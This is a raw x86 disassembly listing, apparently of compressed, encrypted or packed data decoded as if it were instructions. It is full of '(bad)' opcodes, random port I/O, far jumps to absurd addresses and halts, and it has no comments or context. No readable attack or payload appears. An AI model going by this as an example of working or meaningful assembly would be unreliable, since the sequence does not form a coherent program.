  41b0b3:	scas   eax,DWORD PTR es:[edi]
  41b0b4:	shr    BYTE PTR [ebx],1
  41b0b6:	iret   
  41b0b7:	pop    ecx
  41b0b8:	mov    dl,0x15
  41b0ba:	aaa    
  41b0bb:	jo     0x41b04d
  41b0bd:	in     eax,0x53
  41b0bf:	sbb    al,0xec
  41b0c1:	mov    bl,0x7f
  41b0c3:	pop    ecx
  41b0c4:	aad    0xcb
  41b0c6:	mov    ebx,0xd6e4167d
  41b0cb:	or     BYTE PTR ds:0x17522fb,0xdd
  41b0d2:	pusha  
  41b0d3:	mov    ebx,0x97b164b9
  41b0d8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b0d9:	sub    DWORD PTR [eax],0xd4778ff7
  41b0df:	out    0xec,al
  41b0e1:	das    
  41b0e2:	inc    esp
  41b0e3:	adc    BYTE PTR [edx+0x59bf53a3],dh
  41b0e9:	add    edx,eax
  41b0eb:	jns    0x41b0a2
  41b0ed:	pop    eax
  41b0ee:	mov    eax,ds:0x21892c4b
  41b0f3:	xor    al,0xc6
  41b0f5:	sub    edi,DWORD PTR ds:0xbfc46d22
  41b0fb:	add    DWORD PTR [esi-0x137be56e],esi
  41b101:	dec    ebp
  41b102:	push   cs
  41b103:	mov    cs:0x11bd4946,al
  41b109:	sar    DWORD PTR [ebx-0x37],cl
  41b10c:	pop    ebp
  41b10d:	test   bl,bh
  41b10f:	sbb    BYTE PTR [edi-0xf],0xf9
  41b113:	aas    
  41b114:	in     al,0x52
  41b116:	int    0x84
  41b118:	cmp    BYTE PTR [esi],bh
  41b11a:	loope  0x41b183
  41b11c:	repz mov ebx,0xa63ad86c
  41b122:	and    DWORD PTR [esp+ebp*8-0x72],0xffffffc5
  41b127:	or     al,0x7e
  41b129:	and    al,BYTE PTR [eax-0x4dc59184]
  41b12f:	lea    ebp,[eax+0x31366eb4]
  41b135:	jle    0x41b132
  41b137:	pop    eax
  41b138:	lods   eax,DWORD PTR ds:[esi]
  41b139:	lods   al,BYTE PTR ds:[esi]
  41b13a:	les    esi,FWORD PTR [edi-0x24542d64]
  41b140:	jnp    0x41b137
  41b142:	out    dx,al
  41b143:	aaa    
  41b144:	popa   
  41b145:	jo     0x41b174
  41b147:	jmp    0xa623e02a
  41b14c:	mov    ecx,0x599fcb23
  41b151:	scas   al,BYTE PTR es:[edi]
  41b152:	mov    WORD PTR [esi-0x63],es
  41b155:	sub    BYTE PTR [ebx],al
  41b157:	inc    esp
  41b158:	mov    bh,ch
  41b15a:	and    al,0xa1
  41b15c:	inc    ebx
  41b15d:	out    0x24,eax
  41b15f:	pop    ebp
  41b160:	call   0x66e863ce
  41b165:	stos   DWORD PTR es:[edi],eax
  41b166:	mov    ds:0x1427671b,al
  41b16b:	loop   0x41b182
  41b16d:	jp     0x41b1e1
  41b16f:	dec    ebx
  41b170:	push   eax
  41b171:	aaa    
  41b172:	jnp    0x41b1a1
  41b174:	aad    0xa6
  41b176:	pop    es
  41b177:	setp   BYTE PTR [ebx-0x52]
  41b17b:	mov    esp,0x94f4c05d
  41b180:	mov    WORD PTR [edi],?
  41b182:	adc    ebp,0x125813ef
  41b188:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b189:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b18a:	(bad)  
  41b18b:	(bad)
  41b190:	mov    esp,gs
  41b192:	or     dl,BYTE PTR [ecx-0x726633d3]
  41b198:	xor    BYTE PTR [ebx-0x5f],bh
  41b19b:	pop    edx
  41b19c:	(bad)  
  41b19d:	cmc    
  41b19e:	mov    ebx,0xcdd80a78
  41b1a3:	cmp    BYTE PTR [ebx+0x10],dh
  41b1a6:	push   esi
  41b1a7:	cmp    DWORD PTR [eax],ecx
  41b1a9:	sar    BYTE PTR [ebx],1
  41b1ab:	mov    ecx,0xe2ef5807
  41b1b0:	add    eax,0x367df839
  41b1b5:	add    eax,0x7e13f73
  41b1ba:	int3   
  41b1bb:	push   edi
  41b1bc:	sahf   
  41b1bd:	(bad)  
  41b1be:	xlat   BYTE PTR ds:[ebx]
  41b1bf:	dec    edi
  41b1c0:	loop   0x41b218
  41b1c2:	pushf  
  41b1c3:	dec    esi
  41b1c4:	xchg   DWORD PTR [ebp-0x23d6e2ae],ecx
  41b1ca:	or     eax,0x7fd4db1a
  41b1cf:	adc    al,0x97
  41b1d1:	or     eax,0xbece62c6
  41b1d6:	out    0x6f,eax
  41b1d8:	dec    edx
  41b1d9:	dec    edx
  41b1da:	or     DWORD PTR ds:0x23288bdb,ecx
  41b1e0:	sub    eax,0xbbe6de9e
  41b1e5:	sub    al,ah
  41b1e7:	xchg   ebx,eax
  41b1e8:	jge    0x41b239
  41b1ea:	test   BYTE PTR [eax-0x47b6829c],al
  41b1f0:	jns    0x41b1e4
  41b1f2:	lods   eax,DWORD PTR ds:[esi]
  41b1f3:	mov    esi,DWORD PTR [eax-0x2b5a0ddd]
  41b1f9:	aas    
  41b1fa:	adc    BYTE PTR [ebp-0x7e],dh
  41b1fd:	mov    bl,0xa2
  41b1ff:	add    al,0xb0
  41b201:	xchg   DWORD PTR [ecx-0x36],esi
  41b204:	inc    eax
  41b205:	(bad)  
  41b206:	dec    ecx
  41b207:	xlat   BYTE PTR ds:[ebx]
  41b208:	mov    eax,0xbda04dca
  41b20d:	not    BYTE PTR [edi]
  41b20f:	pop    esi
  41b210:	mov    esp,0x30037b08
  41b215:	sub    eax,0x6284e46c
  41b21a:	popa   
  41b21b:	and    DWORD PTR [edx-0x6e9542bc],ecx
  41b221:	adc    eax,0xc3b122d4
  41b226:	test   al,0x0
  41b228:	mov    ds:0x801185f0,eax
  41b22d:	pop    edx
  41b22f:	fwait
  41b230:	in     eax,0xce
  41b232:	lds    eax,FWORD PTR [edi*2-0x1d1630cf]
  41b239:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b23a:	jg     0x41b1be
  41b23c:	test   eax,0x2d1e7877
  41b241:	hlt    
  41b242:	js     0x41b280
  41b244:	mov    ecx,0x3629b6a3
  41b249:	sub    edx,DWORD PTR [edx]
  41b24b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b24c:	and    eax,0x572557e0
  41b251:	mov    esi,0x5123758f
  41b256:	push   ecx
  41b257:	in     eax,0x7a
  41b259:	aam    0x8d
  41b25b:	jg     0x41b221
  41b25d:	in     al,dx
  41b25e:	inc    eax
  41b25f:	pushf  
  41b260:	pop    ebx
  41b261:	pop    edx
  41b262:	aas    
  41b263:	xchg   esp,eax
  41b264:	out    dx,eax
  41b265:	sub    al,0x46
  41b267:	lahf   
  41b268:	xor    ah,0x7d
  41b26b:	xchg   cl,ch
  41b26d:	and    eax,0x475fb2da
  41b272:	retf   
  41b273:	rcl    edi,cl
  41b275:	in     eax,dx
  41b276:	fwait
  41b277:	pop    ecx
  41b278:	rcr    DWORD PTR [esi],0xa2
  41b27b:	repz cdq 
  41b27d:	clc    
  41b27e:	pop    esp
  41b27f:	push   ecx
  41b280:	(bad)  
  41b282:	cwde   
  41b283:	xor    al,0x3c
  41b285:	jecxz  0x41b302
  41b287:	jmp    0x41b240
  41b289:	clc    
  41b28a:	mov    ecx,0xeaaa7fb
  41b28f:	jne    0x41b251
  41b291:	sbb    dh,BYTE PTR [edi]
  41b293:	cmp    esp,DWORD PTR [eax+edi*4]
  41b296:	cdq    
  41b297:	pop    ebp
  41b298:	leave  
  41b299:	sbb    cl,BYTE PTR ds:0x23b24bbb
  41b29f:	add    eax,0x17094a8c
  41b2a4:	into   
  41b2a5:	fdiv   st(6),st
  41b2a7:	sbb    eax,0xb4c9871d
  41b2ac:	popa   
  41b2ad:	rcr    esi,1
  41b2af:	ja     0x41b328
  41b2b1:	inc    esi
  41b2b2:	push   esi
  41b2b3:	push   eax
  41b2b4:	and    DWORD PTR [ebp-0x59],edi
  41b2b7:	test   DWORD PTR [edi+0x3a],esi
  41b2ba:	or     ebx,DWORD PTR [ebp+0x1f18643a]
  41b2c0:	retf   0x5f1c
  41b2c3:	adc    DWORD PTR [ecx-0x78],esi
  41b2c6:	pop    ebx
  41b2c7:	xchg   ebp,eax
  41b2c8:	mov    WORD PTR [ecx+ecx*2],?
  41b2cb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b2cc:	out    dx,al
  41b2cd:	mov    esi,DWORD PTR [edi]
  41b2cf:	loopne 0x41b30c
  41b2d1:	inc    esi
  41b2d2:	xchg   ecx,eax
  41b2d3:	ds xor eax,0xb0e2c83e
  41b2d9:	stos   DWORD PTR es:[edi],eax
  41b2da:	push   es
  41b2db:	or     ebx,eax
  41b2dd:	es xchg edi,eax
  41b2df:	je     0x41b299
  41b2e1:	stos   BYTE PTR es:[edi],al
  41b2e2:	test   al,0xc
  41b2e4:	fadd   QWORD PTR [esi-0x74]
  41b2e7:	push   ebp
  41b2e8:	cmc    
  41b2e9:	pop    es
  41b2ea:	(bad)  
  41b2eb:	and    BYTE PTR [esi+esi*2],dl
  41b2ee:	mov    esp,0x28973f23
  41b2f3:	push   ebp
  41b2f4:	jo     0x41b28f
  41b2f6:	mov    edi,0x1d651342
  41b2fb:	cmp    al,0xda
  41b2fd:	adc    ah,ch
  41b2ff:	mov    ebp,0xc59f407f
  41b304:	mov    edi,0xbb94318
  41b309:	adc    BYTE PTR [edx-0x34f2556],bh
  41b30f:	xor    al,0xfa
  41b311:	xchg   ecx,eax
  41b312:	jg     0x41b2db
  41b314:	imul   esp,ebp,0x3de58c01
  41b31a:	xlat   BYTE PTR ds:[ebx]
  41b31b:	mov    dh,0xa2
  41b31d:	int3   
  41b31e:	in     al,dx
  41b31f:	fwait
  41b320:	adc    edx,edi
  41b322:	imul   eax,DWORD PTR [edx+ecx*8],0x4a585ead
  41b329:	rcr    BYTE PTR [ecx+eiz*8-0x62],1
  41b32d:	hlt    
  41b32e:	arpl   WORD PTR [esi-0x53],sp
  41b331:	fisttp QWORD PTR [eax+0x52]
  41b334:	sbb    edi,esp
  41b336:	xor    bl,bl
  41b338:	mov    ebx,0x94de2eed
  41b33d:	retf   
  41b33e:	lds    eax,FWORD PTR [edi+0x10081f8e]
  41b344:	pop    edi
  41b345:	cwde   
  41b346:	inc    esi
  41b347:	xor    BYTE PTR [edi-0x58],ch
  41b34a:	inc    eax
  41b34b:	test   BYTE PTR [ecx-0x46],cl
  41b34e:	and    BYTE PTR [eax+0x5e],0x6f
  41b352:	sbb    eax,DWORD PTR [ebx-0x2]
  41b355:	jmp    0x4dd0:0xdc860c68
  41b35c:	mov    ?,WORD PTR [esi+0x67]
  41b35f:	mov    bh,0x0
  41b361:	adc    ebp,DWORD PTR [ebp-0x67]
  41b364:	push   esi
  41b365:	cmps   BYTE PTR fs:[esi],BYTE PTR es:[edi]
  41b367:	push   edi
  41b368:	sub    edx,DWORD PTR [eax+0x4010bbf0]
  41b36e:	(bad)  
  41b36f:	add    cl,0xda
  41b372:	sub    DWORD PTR [ecx],eax
  41b374:	jp     0x41b331
  41b376:	stos   DWORD PTR es:[edi],eax
  41b377:	cdq    
  41b378:	jp     0x41b37d
  41b37a:	loope  0x41b3a7
  41b37c:	mov    ah,0xfa
  41b37e:	pop    esi
  41b37f:	cld    
  41b380:	cdq    
  41b381:	jbe    0x41b34f
  41b383:	loop   0x41b3cc
  41b385:	adc    ah,BYTE PTR [ebp+0x65]
  41b388:	push   0x28
  41b38a:	ficom  DWORD PTR [ebp+0x5f]
  41b38d:	(bad)  [ecx]
  41b38f:	mov    ds:0x9c76c750,al
  41b394:	adc    al,ah
  41b396:	mov    ebx,0xc4e196f5
  41b39b:	addr16 pushf 
  41b39d:	jnp    0x41b3fe
  41b39f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b3a0:	in     eax,dx
  41b3a1:	mov    ebx,0xb4c712bb
  41b3a6:	add    al,0xbb
  41b3a8:	xchg   BYTE PTR [esi-0x69f93f15],cl
  41b3ae:	jnp    0x41b3e1
  41b3b0:	scas   eax,DWORD PTR es:[edi]
  41b3b1:	inc    esi
  41b3b2:	add    ebp,DWORD PTR [ebp+0x2a7ad890]
  41b3b8:	pop    ebx
  41b3b9:	cmp    DWORD PTR [eax+edx*1+0x640993cf],ebp
  41b3c0:	loop   0x41b42d
  41b3c2:	hlt    
  41b3c3:	imul   esp,DWORD PTR [ebx],0xffffffbd
  41b3c6:	cmp    BYTE PTR [esi],dh
  41b3c8:	retf   0xc59b
  41b3cb:	mov    edi,DWORD PTR [esi-0x4436eecc]
  41b3d1:	(bad)  
  41b3d2:	jb     0x41b3d8
  41b3d4:	clc    
  41b3d5:	sub    eax,0x11ed58a7
  41b3da:	jge    0x41b39e
  41b3dc:	inc    ebp
  41b3dd:	mov    cl,0xc9
  41b3df:	push   esp
  41b3e0:	pcmpgtw mm3,QWORD PTR [esi+0x35b6e4b5]
  41b3e7:	pop    edx
  41b3e8:	ins    BYTE PTR es:[edi],dx
  41b3e9:	adc    al,0x57
  41b3eb:	inc    ecx
  41b3ec:	es in  eax,0x86
  41b3ef:	and    bl,dh
  41b3f1:	and    al,0x1
  41b3f3:	add    al,0xaa
  41b3f5:	cmp    BYTE PTR [eax-0xd],al
  41b3f8:	xor    DWORD PTR ds:0xb7a1d769,eax
  41b3fe:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b3ff:	iret   
  41b400:	push   ebp
  41b401:	sub    al,0x8
  41b403:	pop    edx
  41b404:	push   ebx
  41b405:	leave  
  41b406:	inc    edi
  41b407:	not    eax
  41b409:	shl    bl,0xa5
  41b40c:	leave  
  41b40d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b40e:	and    DWORD PTR [eax+0x1d],ecx
  41b411:	arpl   WORD PTR [eax],bp
  41b413:	mov    al,0x94
  41b415:	fidiv  DWORD PTR [ecx+0x21]
  41b418:	push   esp
  41b419:	jg     0x41b3c3
  41b41b:	inc    ecx
  41b41c:	out    0x72,eax
  41b41e:	lock sub esp,DWORD PTR [eax+0x2e88a0b4]
  41b425:	fst    DWORD PTR [ebx+0x6e]
  41b428:	ja     0x41b488
  41b42a:	(bad)  [edi+esi*8+0x71]
  41b42e:	retf   
  41b42f:	or     BYTE PTR [esi],cl
  41b431:	inc    ecx
  41b432:	scas   al,BYTE PTR es:[edi]
  41b433:	lea    ebp,[edi]
  41b435:	jne    0x41b485
  41b437:	outs   dx,BYTE PTR ds:[esi]
  41b438:	fiadd  WORD PTR [bx+si-0x4fd0]
  41b43d:	mov    esi,0xad7c1583
  41b442:	mov    bh,0x84
  41b444:	(bad)  
  41b445:	cmp    al,0xae
  41b447:	lods   al,BYTE PTR ds:[esi]
  41b448:	(bad)  
  41b449:	retf   
  41b44a:	adc    dl,bh
  41b44c:	cwde   
  41b44d:	add    eax,DWORD PTR [esi+0xa2dbf76]
  41b453:	arpl   WORD PTR ds:0x9ab6e44,cx
  41b459:	push   0x6b5d55e5
  41b45e:	mov    dl,0x6c
  41b460:	(bad)  
  41b461:	call   0xd0779794
  41b466:	jmp    0x4a62bcf0
  41b46b:	nop
  41b46c:	dec    eax
  41b46d:	jge    0x41b3fd
  41b46f:	mov    bl,0x2b
  41b471:	scas   eax,DWORD PTR es:[edi]
  41b472:	add    al,0x47
  41b474:	bound  ecx,QWORD PTR [edi+0x25]
  41b477:	or     eax,0xc648be4f
  41b47c:	pop    ebp
  41b47d:	arpl   WORD PTR [edx-0x7bb2cbc3],sp
  41b483:	mov    bh,0x32
  41b485:	loope  0x41b440
  41b487:	imul   ebp,DWORD PTR [edx-0x1b],0x0
  41b48b:	popf   
  41b48c:	xor    DWORD PTR [ebx+0x7462dc57],0xa81c9592
  41b496:	mov    ebx,edi
  41b498:	mov    ecx,0xf63ffd65
  41b49d:	mov    DWORD PTR ds:0x7acfc7b5,eax
  41b4a3:	int3   
  41b4a4:	fwait
  41b4a5:	cmp    BYTE PTR ds:0x7dbdf50f,ah
  41b4ab:	inc    edi
  41b4ac:	jmp    0xef61:0xb2f37980
  41b4b3:	in     eax,dx
  41b4b4:	xchg   BYTE PTR ds:0x4084e3b5,bh
  41b4ba:	call   0x6cc6:0x60664737
  41b4c1:	xchg   DWORD PTR [esi+ebx*4],edx
  41b4c4:	dec    edx
  41b4c5:	jb     0x41b515
  41b4c7:	loope  0x41b4c5
  41b4c9:	aaa    
  41b4ca:	dec    ebp
  41b4cb:	mov    ebx,DWORD PTR [ebp+0x65]
  41b4ce:	mov    eax,ds:0x5f340eb0
  41b4d3:	cwde   
  41b4d4:	jno    0x41b459
  41b4d6:	(bad)  
  41b4d7:	enter  0xe861,0xd8
  41b4db:	les    eax,FWORD PTR [ebx+0x60]
  41b4de:	pushf  
  41b4df:	xor    dl,BYTE PTR [ecx-0x41878a78]
  41b4e5:	or     al,0x7e
  41b4e7:	out    0x1f,eax
  41b4e9:	pop    ebx
  41b4ea:	jb     0x41b4e7
  41b4ec:	call   DWORD PTR [ebx+0xfa6a597]
  41b4f2:	popf   
  41b4f3:	adc    BYTE PTR [eax+eiz*2],bh
  41b4f6:	aaa    
  41b4f7:	push   0xa7c4e76c
  41b4fc:	ja     0x41b4de
  41b4fe:	add    BYTE PTR [edi+0x508fa313],dl
  41b504:	xchg   edx,eax
  41b505:	in     al,0x56
  41b507:	mov    al,0x75
  41b509:	(bad)  
  41b50a:	dec    esp
  41b50b:	xchg   BYTE PTR [edi+0x56],cl
  41b50e:	jmp    0x41b4cd
  41b510:	(bad)
  41b514:	xor    BYTE PTR [edx-0x72],cl
  41b517:	(bad)  
  41b518:	mov    ds,WORD PTR [edi+ecx*2+0x7bd96466]
  41b51f:	mov    ?,WORD PTR [ebp-0x1dcb3f69]
  41b525:	adc    al,BYTE PTR [esi]
  41b527:	(bad)  
  41b529:	test   DWORD PTR [edi+0x4],ebp
  41b52c:	dec    esp
  41b52d:	fsubrp st(2),st
  41b52f:	stos   DWORD PTR es:[edi],eax
  41b530:	xchg   ebp,eax
  41b531:	(bad)  
  41b532:	ss stos BYTE PTR es:[edi],al
  41b534:	arpl   WORD PTR [esi+eax*1],ax
  41b537:	push   ecx
  41b538:	mov    eax,0xf9d19ce4
  41b53d:	lods   eax,DWORD PTR ds:[esi]
  41b53e:	popa   
  41b53f:	xchg   esp,eax
  41b540:	pop    es
  41b541:	in     eax,0x2f
  41b543:	sub    BYTE PTR ds:0xe6a8a691,bl
  41b549:	les    esp,FWORD PTR [esi+0x34a03064]
  41b54f:	adc    dl,bl
  41b551:	in     eax,dx
  41b552:	fisttp DWORD PTR [ebp+0x52]
  41b555:	test   BYTE PTR [ebp+0x79],0xdc
  41b559:	jnp    0x41b525
  41b55b:	repz hlt 
  41b55d:	pop    ebp
  41b55e:	pushf  
  41b55f:	mov    ebx,0x6c6c5a44
  41b564:	dec    ecx
  41b565:	in     al,0x1c
  41b567:	test   eax,0x30e4e3a5
  41b56c:	inc    esp
  41b56d:	xchg   cl,cl
  41b56f:	sub    dh,BYTE PTR [edx-0x5c65aa84]
  41b575:	pop    eax
  41b576:	popf   
  41b577:	and    al,al
  41b579:	lds    esi,FWORD PTR [esi]
  41b57b:	shl    BYTE PTR [ecx+0x1e],0x80
  41b57f:	jle    0x41b5c3
  41b581:	lock mov ah,0x1e
  41b584:	pop    ebp
  41b585:	push   edx
  41b586:	push   cs
  41b587:	xchg   DWORD PTR es:[ecx-0x502a8cd7],edx
  41b58e:	scas   al,BYTE PTR es:[edi]
  41b58f:	mov    ch,0xc
  41b591:	out    0x61,eax
  41b593:	loopne 0x41b56e
  41b595:	jle    0x41b5d8
  41b597:	push   eax
  41b598:	mov    ebp,0xdf6dda04
  41b59d:	add    eax,0xafa1d9c2
  41b5a2:	fmul   QWORD PTR [ebp-0x54923370]
  41b5a8:	in     eax,dx
  41b5a9:	es (bad) 
  41b5ab:	js     0x41b551
  41b5ad:	push   0x939b8a5e
  41b5b2:	lea    esi,[ebx+ebx*8]
  41b5b5:	or     edi,ebp
  41b5b7:	cmp    bh,BYTE PTR ds:[edi+0x72c3faf4]
  41b5be:	xchg   ebx,eax
  41b5bf:	mov    ebx,0x504d03c8
  41b5c4:	dec    edx
  41b5c5:	call   0x37a36598
  41b5ca:	mov    al,ds:0xa7035136
  41b5cf:	outs   dx,BYTE PTR ds:[esi]
  41b5d0:	repz adc DWORD PTR [ebx+0x3c],ebx
  41b5d4:	cli    
  41b5d5:	in     al,0xb4
  41b5d7:	test   DWORD PTR [edx-0x3466ebf4],edi
  41b5dd:	mov    ecx,0x3bded2fc
  41b5e2:	push   ds
  41b5e3:	lods   al,BYTE PTR ds:[esi]
  41b5e4:	leave  
  41b5e5:	repnz pop ecx
  41b5e7:	mov    edi,0xd158661d
  41b5ec:	(bad)  
  41b5ee:	and    al,0x70
  41b5f0:	dec    esi
  41b5f1:	idiv   BYTE PTR [ecx+0x168582f6]
  41b5f7:	je     0x41b57a
  41b5f9:	and    al,0x5a
  41b5fb:	mov    bh,dl
  41b5fd:	test   eax,0x9b60ae70
  41b602:	cwde   
  41b603:	lahf   
  41b604:	inc    edi
  41b605:	clc    
  41b606:	rcl    DWORD PTR [esi-0x55],1
  41b609:	(bad)
  41b60c:	ret    0x9f7
  41b60f:	js     0x41b64a
  41b611:	xor    DWORD PTR [edi-0x45],ebp
  41b614:	outs   dx,DWORD PTR ds:[esi]
  41b615:	fdivp  st(4),st
  41b617:	stc    
  41b618:	ja     0x41b5a0
  41b61a:	fwait
  41b61b:	mov    ecx,DWORD PTR [esi+0x46ba39d1]
  41b621:	(bad)  
  41b622:	out    0x2,al
  41b624:	imul   ebp,edi,0xffffffda
  41b627:	or     DWORD PTR [edi],0xc2ad4fd6
  41b62d:	mov    cl,0xc7
  41b62f:	push   0x4a
  41b631:	jecxz  0x41b5b6
  41b633:	aaa    
  41b634:	or     DWORD PTR [esi+eiz*4-0x43f274a3],0x9
  41b63c:	in     eax,0x13
  41b63e:	inc    eax
  41b63f:	xor    al,0x4b
  41b641:	push   ss
  41b642:	rcr    DWORD PTR [edi+0x63],1
  41b645:	jae    0x41b692
  41b647:	in     al,0x29
  41b649:	or     bh,BYTE PTR [eax]
  41b64b:	out    dx,eax
  41b64c:	or     bl,BYTE PTR [edi]
  41b64e:	push   edi
  41b64f:	into   
  41b650:	inc    ecx
  41b651:	je     0x41b609
  41b653:	push   eax
  41b654:	repz fprem1 
  41b657:	dec    ebp
  41b658:	jl     0x41b684
  41b65a:	fsub   QWORD PTR [eax+0x1f]
  41b65d:	dec    eax
  41b65e:	dec    esi
  41b65f:	sti    
  41b660:	push   edi
  41b661:	imul   DWORD PTR [ebp+0x5c]
  41b664:	fadd   QWORD PTR [ecx]
  41b666:	lds    eax,FWORD PTR [eax-0x40]
  41b669:	sub    cl,BYTE PTR [ebp-0x3]
  41b66c:	sbb    DWORD PTR [ecx+eiz*1-0x55641d7f],eax
  41b673:	mov    ebp,0xdd46b2e9
  41b678:	jmp    0x56a933de
  41b67d:	pusha  
  41b67e:	push   cs
  41b67f:	adc    dl,BYTE PTR [edi-0x6d]
  41b682:	jmp    0x41b68b
  41b684:	call   0x919d:0xe1ef4b60
  41b68b:	fsub   DWORD PTR [edi+0xbab9365]
  41b691:	imul   edi,edi,0x322102a6
  41b697:	fisub  DWORD PTR [edx]
  41b699:	adc    al,0x9a
  41b69b:	scas   eax,DWORD PTR es:[edi]
  41b69c:	hlt    
  41b69d:	add    DWORD PTR [eax-0x18],0xddacae9
  41b6a4:	inc    ebp
  41b6a5:	stos   DWORD PTR es:[edi],eax
  41b6a6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b6a7:	dec    eax
  41b6a8:	pushf  
  41b6a9:	or     ecx,0xa7faca4
  41b6af:	mov    ebp,0x2c986b86
  41b6b4:	cli    
  41b6b5:	adc    ch,dh
  41b6b7:	and    ch,bh
  41b6b9:	inc    edi
  41b6ba:	mov    edx,0xa7242e99
  41b6bf:	sub    eax,DWORD PTR [edx]
  41b6c1:	mov    dh,0xaf
  41b6c3:	mov    DWORD PTR [esi],edi
  41b6c5:	inc    ebx
  41b6c6:	bound  edi,QWORD PTR [esi-0x50]
  41b6c9:	mov    esp,ebp
  41b6cb:	nop
  41b6cc:	icebp  
  41b6cd:	test   ebx,ecx
  41b6cf:	xor    al,0xe5
  41b6d1:	call   0x607ebf47
  41b6d6:	adc    eax,0x7f9c5bcc
  41b6db:	sub    al,0x30
  41b6dd:	xchg   BYTE PTR [ebp+0x47],bl
  41b6e0:	shl    dh,0xac
  41b6e3:	xchg   BYTE PTR [esi-0x60],bh
  41b6e6:	into   
  41b6e7:	fldcw  WORD PTR [edx-0x67]
  41b6ea:	in     al,dx
  41b6eb:	imul   eax,DWORD PTR [eax-0x260c1944],0x4398ce40
  41b6f5:	inc    ecx
  41b6f6:	cli    
  41b6f7:	aad    0x6a
  41b6f9:	xor    eax,0x92a2ead8
  41b6fe:	pop    ss
  41b6ff:	sbb    cl,ah
  41b701:	add    eax,0x4c847ae
  41b706:	or     BYTE PTR [ebp+0x13298c0f],bl
  41b70c:	mov    ebx,DWORD PTR [ebp+0x11]
  41b70f:	dec    edx
  41b710:	std    
  41b711:	xchg   edi,eax
  41b712:	jnp    0x41b748
  41b714:	and    al,0x9d
  41b716:	cmp    al,0xef
  41b718:	cs jne 0x41b6b4
  41b71b:	inc    ebp
  41b71c:	repnz mov ds:0xe462ee15,al
  41b722:	loopne 0x41b6c7
  41b724:	pop    edi
  41b725:	repnz and esp,DWORD PTR [ebp+0x4d2f6947]
  41b72c:	sbb    BYTE PTR [eax+0x9],0x89
  41b730:	sahf   
  41b731:	cmp    ah,ah
  41b733:	ja     0x41b774
  41b735:	test   al,0xb6
  41b737:	and    al,0x85
  41b739:	mov    ecx,0x2733441b
  41b73e:	loope  0x41b791
  41b740:	jnp    0x41b7c0
  41b742:	sbb    BYTE PTR [esp+edi*2-0x2a],bl
  41b746:	xchg   ecx,eax
  41b747:	jmp    0x1e74bf9c
  41b74c:	add    DWORD PTR [edx],esp
  41b74e:	mov    cl,0xbf
  41b750:	retf   0x4051
  41b753:	out    0x0,al
  41b755:	aad    0x7c
  41b757:	mov    esp,0xb62a53b5
  41b75c:	std    
  41b75d:	mov    DWORD PTR [eax-0x1d],edx
  41b760:	jo     0x41b7ad
  41b762:	pop    ecx
  41b763:	in     eax,0x3e
  41b765:	or     esi,ebx
  41b767:	popf   
  41b768:	std    
  41b769:	mov    edx,0x42d4a338
  41b76e:	jg     0x41b714
  41b770:	adc    al,0xbf
  41b772:	sub    bh,BYTE PTR [ebx+0x1747f952]
  41b778:	lds    ebx,FWORD PTR [ecx+0x45d372c3]
  41b77e:	sbb    eax,0xee2e8751
  41b783:	mov    ebx,0x54c6bdb7
  41b788:	call   0xb22b:0xfd69a446
  41b78f:	iret   
  41b790:	out    0x8c,eax
  41b792:	jle    0x41b735
  41b794:	outs   dx,DWORD PTR ds:[esi]
  41b795:	and    DWORD PTR [eax],esi
  41b797:	in     al,dx
  41b798:	addr16 mov dh,0x9d
  41b79b:	lods   eax,DWORD PTR ds:[esi]
  41b79c:	pop    edx
  41b79d:	fprem1 
  41b79f:	addr16 sbb al,0x44
  41b7a2:	mov    BYTE PTR [ebp+0x7a],cl
  41b7a5:	mov    eax,ds:0x25b52c9
  41b7aa:	sahf   
  41b7ab:	adc    DWORD PTR [edi-0x3eee6428],0x67
  41b7b2:	adc    al,0x81
  41b7b4:	mov    bl,0x52
  41b7b6:	xlat   BYTE PTR ds:[ebx]
  41b7b7:	or     ecx,DWORD PTR [esi]
  41b7b9:	xchg   esp,eax
  41b7ba:	fnstsw WORD PTR [edi]
  41b7bc:	jnp    0x41b798
  41b7be:	(bad)  
  41b7bf:	mov    eax,0x5afebb82
  41b7c4:	cs mov ch,dh
  41b7c7:	test   BYTE PTR [ebx+esi*1],ah
  41b7ca:	add    ah,BYTE PTR [ebx+0x5a]
  41b7cd:	mov    ds:0xd72a5131,eax
  41b7d2:	and    dh,BYTE PTR [edx-0x5af3584b]
  41b7d8:	xor    BYTE PTR [ecx-0x192e17de],bl
  41b7de:	(bad)  
  41b7df:	(bad)  
  41b7e1:	out    dx,al
  41b7e2:	mov    al,0x11
  41b7e4:	pop    ebx
  41b7e5:	fld    DWORD PTR [ebx]
  41b7e7:	aas    
  41b7e8:	sub    BYTE PTR [edx-0x25],dh
  41b7eb:	cmp    esi,esi
  41b7ed:	push   cs
  41b7ee:	sub    ebp,DWORD PTR cs:[ebx+esi*2+0x1ef4e4d9]
  41b7f6:	sti    
  41b7f7:	sahf   
  41b7f8:	es mov al,0xbb
  41b7fb:	dec    ebp
  41b7fc:	pushf  
  41b7fd:	(bad)  
  41b7fe:	jae    0x41b7a0
  41b800:	xlat   BYTE PTR ds:[ebx]
  41b801:	inc    ecx
  41b802:	sub    al,0x1c
  41b804:	xor    bh,BYTE PTR [ebx-0x2852a110]
  41b80a:	popa   
  41b80b:	pop    edx
  41b80c:	out    dx,al
  41b80d:	cmp    eax,0xc1ab0912
  41b812:	dec    esi
  41b813:	mov    esp,0xea2f80a7
  41b818:	sub    BYTE PTR [edi+0x65],ah
  41b81b:	mov    ebx,ebx
  41b81d:	icebp  
  41b81e:	in     al,0xdc
  41b820:	inc    ecx
  41b821:	sar    DWORD PTR ds:0x1f284fb4,0x58
  41b828:	pop    edx
  41b829:	in     eax,dx
  41b82a:	stos   DWORD PTR es:[edi],eax
  41b82b:	sbb    DWORD PTR [eax-0x67d1d9c1],esi
  41b831:	lock cmp al,0x3
  41b834:	dec    esi
  41b835:	xchg   edx,eax
  41b836:	xchg   ecx,eax
  41b837:	dec    ebx
  41b838:	and    eax,0x5c30adea
  41b83d:	xor    al,0x7c
  41b83f:	inc    edi
  41b840:	hlt    
  41b841:	(bad)  
